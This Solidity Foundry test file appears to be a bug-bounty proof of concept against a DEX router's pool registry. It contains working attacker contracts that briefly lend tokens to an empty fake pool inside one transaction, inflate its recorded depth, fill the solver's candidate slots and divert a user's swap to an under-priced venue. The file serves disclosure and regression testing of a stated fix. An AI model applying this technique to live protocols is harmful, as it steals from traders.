// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.36;

// =============================================================================
//  HUNT (ConcMassFix75): audit of PR #75 / #79 - "a concentrated pool's mass is
//  what it holds, at every producer".
//
//  Every producer now reads `balanceOf` instead of `liquidity()`. `balanceOf`
//  is an INSTANT, and `Router._recordHits` takes that instant INSIDE the
//  caller's own transaction, after the pool's `swap()` has already returned.
//  The bucket derived from it is PERSISTED (`tickSlot` rewrites bits [63:60] on
//  every routed swap) and is never re-derived for a pool the Solver then
//  refuses to route.
//
//  So: rent the mass for the length of one call, show it to the measurement,
//  and take it back in the same transaction. The seat is permanent; the mass
//  was never there.
//
//  Reported by Seavia Resources through the bug bounty programme; this file is
//  their proof of concept. Since 2026-10-07 the cached bucket still records the
//  instant (the probe below still reads it), but wherever rows are RANKED against
//  each other in the funnel the Solver caps it by what the pool holds at that
//  moment (`Solver._capByLiveDepth`): the rented seat is worth an empty book.
//
//  Run:
//    forge test --match-path 'test/RentedMassBuysNoSeat.t.sol' -vv
// =============================================================================

import {Test} from "forge-std/Test.sol";
import {BlazePhoenixHub} from "../src/BlazePhoenixHub.sol";
import {BlazePhoenixSolver} from "../src/BlazePhoenixSolver.sol";
import {BlazePhoenixRouter} from "../src/BlazePhoenixRouter.sol";
import {BlazePhoenixCore as BPC, Route, Hop, Leg, RoutePlan} from "../src/BlazePhoenixCore.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockV2Pair} from "./mocks/MockV2Pair.sol";

interface IERC20B {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
    function approve(address s, uint256 a) external returns (bool);
}

interface IRouterB {
    function swapExactIn(
        Route calldata route, uint256 amountIn, uint256 userMinOut, address to, uint256 deadline
    ) external returns (uint256);
}

/// @notice A V3-shaped contract. It declares `liquidity()`; what it holds is its
///         owner's choice, and its owner can take it back at any time.
contract RentedBook {
    address public immutable owner;
    address public token0;
    address public token1;
    uint24  public fee;
    uint160 public sqrtPriceX96;
    uint128 public liquidity;
    uint256 public payBps;      // 0 => pay every tokenOut held
    bool    public sweepIn;     // forward the input to the owner, as a real desk would

    constructor(address a, address b, uint24 f) {
        owner = msg.sender;
        (token0, token1) = a < b ? (a, b) : (b, a);
        fee = f;
    }

    function setState(uint160 sp, uint128 l) external { sqrtPriceX96 = sp; liquidity = l; }
    function setPayBps(uint256 p) external { payBps = p; }
    function setSweepIn(bool s) external { sweepIn = s; }

    function slot0() external view returns (uint160, int24, uint16, uint16, uint16, uint8, bool) {
        return (sqrtPriceX96, 0, 0, 0, 0, 0, true);
    }

    function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160, bytes calldata)
        external returns (int256 amount0, int256 amount1)
    {
        uint256 amountIn = uint256(amountSpecified);
        address tokenOut = zeroForOne ? token1 : token0;
        uint256 held = IERC20B(tokenOut).balanceOf(address(this));
        uint256 pay = payBps == 0 ? held : (amountIn * payBps) / 10_000;
        if (pay > held) pay = held;
        amount0 = zeroForOne ? int256(amountIn) : -int256(pay);
        amount1 = zeroForOne ? -int256(pay) : int256(amountIn);
        (bool ok, ) = msg.sender.call(
            abi.encodeWithSignature("uniswapV3SwapCallback(int256,int256,bytes)", amount0, amount1, ""));
        require(ok, "callback failed");
        if (pay > 0) IERC20B(tokenOut).transfer(recipient, pay);
        if (sweepIn) {
            address tokenIn = zeroForOne ? token0 : token1;
            uint256 got = IERC20B(tokenIn).balanceOf(address(this));
            if (got > 0) IERC20B(tokenIn).transfer(owner, got);
        }
    }

    /// @dev The rent goes home, in the transaction that borrowed it.
    function returnRent() external {
        uint256 b0 = IERC20B(token0).balanceOf(address(this));
        uint256 b1 = IERC20B(token1).balanceOf(address(this));
        if (b0 != 0) IERC20B(token0).transfer(owner, b0);
        if (b1 != 0) IERC20B(token1).transfer(owner, b1);
    }
}

/// @notice The attacker's transaction: show the mass, take the seat, give the
///         mass back. One call, one block, nothing at risk.
contract Renter {
    function run(
        address router, address book, address tA, address tB,
        uint256 rentA, uint256 dust, uint256 legExpOut
    ) external {
        if (rentA != 0) IERC20B(tA).transfer(book, rentA);
        IERC20B(tA).approve(router, type(uint256).max);

        Leg[] memory legs = new Leg[](1);
        legs[0] = Leg({
            pool: book, hooks: address(0), kind: BPC.KIND_V3,
            fee: 3000, tickSpacing: 0,
            zeroForOne: RentedBook(book).token0() == tA, stable: false,
            amountIn: dust, expectedOut: legExpOut, auxId: bytes32(0)
        });
        Hop[] memory hops = new Hop[](1);
        hops[0] = Hop({tokenIn: tA, tokenOut: tB, amountIn: dust, expectedOut: dust, legs: legs});
        Route memory r = Route({
            hops: hops, totalOut: dust, singleOut: dust, singleOutFloor: 0,
            expectedImpactBps: 0, confidenceWad: 0, estGas: 0,
            hasSurplus: false, isV4Bundle: false
        });
        IRouterB(router).swapExactIn(r, dust, 1, address(this), block.timestamp + 1);

        // Same transaction. The registry has already written the bucket.
        if (rentA != 0) RentedBook(book).returnRent();
    }
}

contract RentedMassBuysNoSeatTest is Test {
    BlazePhoenixHub    hub;
    BlazePhoenixSolver solver;
    BlazePhoenixRouter router;

    MockERC20  tokenA;
    MockERC20  tokenB;
    MockV2Pair honest;

    address constant USER = address(0xBEEF);

    uint160 constant Q96        = uint160(uint256(1) << 96);
    uint112 constant DEEP       = uint112(3_000_000e18);   // the honest venue
    uint128 constant DECLARED_L = uint128(1e33);
    uint256 constant DUST       = 1e15;
    uint256 constant ORDER      = 1_000e18;
    uint256 constant RENT       = 2_000_000e18;            // borrowed, returned in-tx

    function setUp() public {
        hub = new BlazePhoenixHub(address(this));
        hub.initialize(address(this), address(0));
        solver = new BlazePhoenixSolver(address(hub));
        router = new BlazePhoenixRouter(
            address(hub), address(solver), address(this), address(0xFEE1), address(0xFEE2));
        hub.setRoles(address(router), address(solver), address(this));

        tokenA = new MockERC20("A", "A");
        tokenB = new MockERC20("B", "B");

        honest = new MockV2Pair(address(tokenA), address(tokenB));
        tokenA.mint(address(honest), DEEP);
        tokenB.mint(address(honest), DEEP);
        honest.setReserves(DEEP, DEEP);
        hub.seedPool(address(honest), BPC.KIND_V2, 30, address(0), address(tokenA), address(tokenB));

        tokenA.mint(USER, 100_000e18);
        vm.prank(USER);
        tokenA.approve(address(router), type(uint256).max);
    }

    function _key(address book) internal view returns (bytes32) {
        return hub.keyOf(book, address(tokenA), address(tokenB));
    }

    /// @dev ONE attacker, ONE pot. The rent is minted exactly once into the
    ///      renter; every seat transfers it into a fresh book, buys the seat and
    ///      takes the rent back inside the same transaction, so the same capital
    ///      pays for every row. `rentMinted` records what the attacker ever had.
    Renter  potRenter;
    uint256 rentMinted;

    function _renter() internal returns (Renter) {
        if (address(potRenter) == address(0)) {
            potRenter = new Renter();
            tokenA.mint(address(potRenter), RENT);
            rentMinted += RENT;
        }
        return potRenter;
    }

    function _seatWithRent(uint256 rentA)
        internal returns (address bookAddr, address renterAddr)
    {
        Renter renter = _renter();
        vm.prank(address(renter));
        RentedBook book = new RentedBook(address(tokenA), address(tokenB), 3000);
        book.setState(Q96, DECLARED_L);
        book.setPayBps(0);                   // pays every tokenB it holds

        tokenA.mint(address(renter), DUST);  // the dust the seat swap really spends
        rentMinted += DUST;
        tokenB.mint(address(book), DUST);    // exactly the fill it owes

        renter.run(address(router), address(book), address(tokenA), address(tokenB), rentA, DUST, DUST);
        return (address(book), address(renter));
    }

    /// @dev The attacker's real venue: concentrated-shaped, holds real tokenB,
    ///      prices 30 % under the market and pays what its own curve promises.
    function _seatGreedy(uint256 holdB) internal returns (RentedBook g) {
        // sqrt(0.7) * 2^96, or its reciprocal, depending on token order.
        uint256 r = 836_660_026_534;                       // sqrt(0.7) * 1e12
        g = new RentedBook(address(tokenA), address(tokenB), 3000);
        g.setState(address(tokenA) < address(tokenB)
            ? uint160(uint256(Q96) * r / 1e12)
            : uint160(uint256(Q96) * 1e12 / r), DECLARED_L);
        g.setPayBps(6_980);                                // ~ its own quote
        g.setSweepIn(true);                                // ends holding only tokenB
        tokenB.mint(address(g), holdB);

        Renter rr = new Renter();
        tokenA.mint(address(rr), DUST);
        rr.run(address(router), address(g), address(tokenA), address(tokenB), 0, DUST, 0);
    }

    function _userSwap() internal returns (uint256 got) {
        uint256 before = tokenB.balanceOf(USER);
        vm.prank(USER);
        router.swapBestExactIn(address(tokenA), address(tokenB), ORDER, 1, USER, block.timestamp + 1);
        got = tokenB.balanceOf(USER) - before;
    }

    // -------------------------------------------------------------------------
    //  CONTROL 1 — the property the fix claims, with no rent. Mirrors the
    //  sponsor's test_AnEmptyBookIsSeatedAtTheMassItHolds_WhichIsNone on this
    //  fixture, so the two runs differ in exactly ONE thing: the rent.
    // -------------------------------------------------------------------------
    function test_control_noRent_theBookIsSeatedAtBucketZero() public {
        (address book, ) = _seatWithRent(0);
        assertEq(hub.getPool(_key(book)), book, "setup: the dust swap must have seated the book");
        uint8 written = BPC.decodeBucket(hub.getSlot(_key(book)));
        emit log_named_uint("bucket, no rent", written);
        emit log_named_uint("psi,    no rent", hub.getPsi(book, address(tokenA), address(tokenB)));
        assertEq(written, 0, "control: an empty book must be seated at bucket 0");
    }

    // -------------------------------------------------------------------------
    //  THE VEHICLE — the same book, the same empty end-state, one transfer in
    //  and one transfer out inside the same transaction. `balanceOf` is an
    //  instant, and `Router._recordHits` takes it inside the attacker's own
    //  frame. Red-to-green against the control above: the ONLY difference is
    //  the rent, which the book gives back before the transaction ends.
    // -------------------------------------------------------------------------
    function test_probe_rentedMassBuysTheSeatTheFixDenies() public {
        (address book, address renter) = _seatWithRent(RENT);

        assertEq(hub.getPool(_key(book)), book, "setup: the book must be seated");
        assertEq(tokenA.balanceOf(book) + tokenB.balanceOf(book), 0,
            "the book still holds the rent - it was not returned");
        assertGe(tokenA.balanceOf(renter) + tokenB.balanceOf(renter), RENT,
            "the renter was out of pocket for the seat");

        uint8 written = BPC.decodeBucket(hub.getSlot(_key(book)));
        uint8 honestB = BPC.decodeBucket(
            hub.getSlot(hub.keyOf(address(honest), address(tokenA), address(tokenB))));
        uint256 psiBook   = hub.getPsi(book, address(tokenA), address(tokenB));
        uint256 psiHonest = hub.getPsi(address(honest), address(tokenA), address(tokenB));
        emit log_named_uint("bucket stamped for a book holding NOTHING", written);
        emit log_named_uint("bucket of the honest 3,000,000-a-side pool", honestB);
        emit log_named_uint("psi book  ", psiBook);
        emit log_named_uint("psi honest", psiHonest);

        // The control above measures 0 for the same book with no rent.
        assertEq(written, honestB,
            "the rented seat did not reach the honest pool's own depth bucket");
        assertGt(psiBook, psiHonest,
            "the rented seat did not out-rank the pool holding 3,000,000 a side");

    }

    // -------------------------------------------------------------------------
    //  CONTROL 2 — the honest path. The attacker's under-priced venue is
    //  registered and out-ranks the honest pool on psi (it carries the
    //  concentrated bonus), but the honest pool still holds the greater mass,
    //  still anchors the band, and still takes the order.
    // -------------------------------------------------------------------------
    function test_control_theGreedyVenueAloneCannotTakeTheOrder() public {
        _seatGreedy(1_200_000e18);
        uint256 got = _userSwap();
        emit log_named_uint("delivered, honest path", got);
        assertGt(got, 900e18, "control: the honest pool must still take the order");
    }

    // -------------------------------------------------------------------------
    //  DEFECT 2 — the impact. Seven books that hold nothing take the seven
    //  remaining funnel slots (MAX_CANDIDATES = 8) with rented mass. The honest
    //  pool is cut from the funnel BEFORE any live measurement runs, the
    //  attacker's under-priced venue is left alone in the band, and it takes
    //  the whole order.
    // -------------------------------------------------------------------------
    function test_poc_rentedSeatsCutTheHonestPoolFromTheFunnel() public {
        _seatGreedy(1_200_000e18);

        uint256 snap = vm.snapshotState();
        uint256 honestGot = _userSwap();
        vm.revertToState(snap);

        for (uint256 i; i < 7; ++i) {
            (address b, ) = _seatWithRent(RENT);
            assertEq(tokenA.balanceOf(b) + tokenB.balanceOf(b), 0, "a book kept its rent");
        }
        // ONE pot paid for all seven seats, and it came home.
        assertEq(rentMinted, RENT + 7 * DUST, "the seven seats needed more than one pot of rent");
        assertGe(tokenA.balanceOf(address(potRenter)), RENT, "the pot did not come back");
        emit log_named_uint("rent ever held by the attacker", rentMinted);

        uint256 attackedGot = _userSwap();
        emit log_named_uint("delivered, honest path        ", honestGot);
        emit log_named_uint("delivered, seven rented seats ", attackedGot);
        emit log_named_uint("lost to the attacker's venue  ",
            honestGot > attackedGot ? honestGot - attackedGot : 0);
        assertGe(attackedGot, honestGot,
            "rented seats cut the honest pool from the funnel and cost the user the difference");
    }

    /// @dev Diagnostic: who is in the registry, at what psi, and who is routed.
    function test_diag_psiTable() public {
        RentedBook g = _seatGreedy(1_200_000e18);
        address[] memory books = new address[](7);
        for (uint256 i; i < 7; ++i) (books[i], ) = _seatWithRent(RENT);

        emit log_named_uint("psi honest", hub.getPsi(address(honest), address(tokenA), address(tokenB)));
        emit log_named_uint("bkt honest", BPC.decodeBucket(hub.getSlot(_key(address(honest)))));
        emit log_named_uint("psi greedy", hub.getPsi(address(g), address(tokenA), address(tokenB)));
        emit log_named_uint("bkt greedy", BPC.decodeBucket(hub.getSlot(_key(address(g)))));
        emit log_named_uint("greedy holds B", tokenB.balanceOf(address(g)));
        emit log_named_uint("greedy holds A", tokenA.balanceOf(address(g)));
        for (uint256 i; i < 7; ++i) {
            emit log_named_uint("psi book", hub.getPsi(books[i], address(tokenA), address(tokenB)));
        }
        RoutePlan memory plan = solver.findBestRoutePlan(address(tokenA), address(tokenB), ORDER);
        for (uint256 i; i < plan.best.hops[0].legs.length; ++i) {
            emit log_named_address("routed leg pool", plan.best.hops[0].legs[i].pool);
            emit log_named_uint("routed leg out ", plan.best.hops[0].legs[i].expectedOut);
        }
        emit log_named_address("honest", address(honest));
        emit log_named_address("greedy", address(g));
    }
}
